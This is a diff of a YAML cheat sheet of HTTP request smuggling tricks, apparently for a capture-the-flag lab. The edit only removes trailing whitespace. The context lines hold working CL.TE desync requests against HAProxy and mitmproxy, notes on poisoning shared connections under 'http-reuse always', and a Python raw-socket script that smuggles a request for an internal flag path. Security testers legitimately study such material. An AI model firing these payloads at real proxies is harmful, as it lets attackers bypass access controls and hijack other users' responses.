@@ -17,18 +17,18 @@ tricks:
       # HAProxy doesn't recognize Transfer-Encoding with \x0b prefix
       # HAProxy uses Content-Length, backend uses Transfer-Encoding
       # This causes CL.TE desync
-      
+
       POST / HTTP/1.1
       Host: localhost
       Content-Length: 65
       Transfer-Encoding:\x0bchunked
-      
+
       0
-      
+
       GET /internal/path HTTP/1.1
       Host: internal.router
-      
-      
+
+
 
   - name: "mitmproxy HTTP Request Smuggling"
     when: "mitmproxy 6.0.2 or below"
@@ -36,18 +36,18 @@ tricks:
     payload: |
       # mitmproxy uses Content-Length, backend uses Transfer-Encoding
       # Smuggled request is forwarded as part of the body
-      
+
       POST / HTTP/1.1
       Host: localhost
       Content-Length: 65
       Transfer-Encoding: chunked
-      
+
       0
-      
+
       GET /internal/path HTTP/1.1
       Host: internal.router
-      
-      
+
+
 
   - name: "HAProxy http-reuse exploitation"
     when: "HAProxy configured with 'http-reuse always'"
@@ -56,7 +56,7 @@ tricks:
       # HAProxy reuses backend connections
       # Smuggled request poisons the connection
       # Next request from another user gets smuggled response
-      
+
       # Step 1: Send smuggling payload
       # Step 2: Smuggled request stays in backend buffer
       # Step 3: Next legitimate request triggers smuggled request
@@ -70,7 +70,7 @@ tricks:
       #     Servername internal.router
       #     ...
       # </VirtualHost>
-      
+
       # Smuggle request with Host: internal.router
       # to access internal virtual host
 
@@ -79,10 +79,10 @@ tricks:
     how: "Use raw sockets to send malformed HTTP"
     payload: |
       import socket
-      
+
       smuggled = "GET /internal/flag HTTP/1.1\r\nHost: internal.router\r\n\r\n"
       body = f"0\r\n\r\n{smuggled}"
-      
+
       payload = (
           f"POST / HTTP/1.1\r\n"
           f"Host: localhost\r\n"
@@ -91,10 +91,9 @@ tricks:
           f"\r\n"
           f"{body}"
       )
-      
+
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.connect(("localhost", 80))
       sock.send(payload.encode())
       response = sock.recv(4096)
       print(response.decode())
-
